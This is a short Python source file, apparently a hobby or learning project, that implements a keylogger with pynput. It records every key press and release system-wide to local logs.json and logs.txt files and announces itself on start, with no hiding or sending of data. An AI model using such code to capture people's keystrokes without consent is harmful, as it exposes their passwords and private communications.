from pynput import keyboard
import json

key_list = []
key_strokes = ""
flag = False

def update_txt_file(text):
    with open("logs.txt", "w") as file:
        file.write(text)

def update_json_file(data):
    with open("logs.json", "w") as file:
        json.dump(data, file, indent=4)

def on_press(key):
    global flag, key_list
    if not flag:
        key_list.append({"Pressed": str(key)})
        flag = True
    else:
        key_list.append({"Held": str(key)})

    update_json_file(key_list)

def on_release(key):
    global flag, key_strokes, key_list
    key_list.append({"Released": str(key)})
    flag = False

    key_strokes += str(key) + " "
    update_txt_file(key_strokes)
    update_json_file(key_list)

def start_keylogger():
    print("Running Keylogger Successfully!")
    print("Saving the key logs in 'logs.json'")

    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
        listener.join()
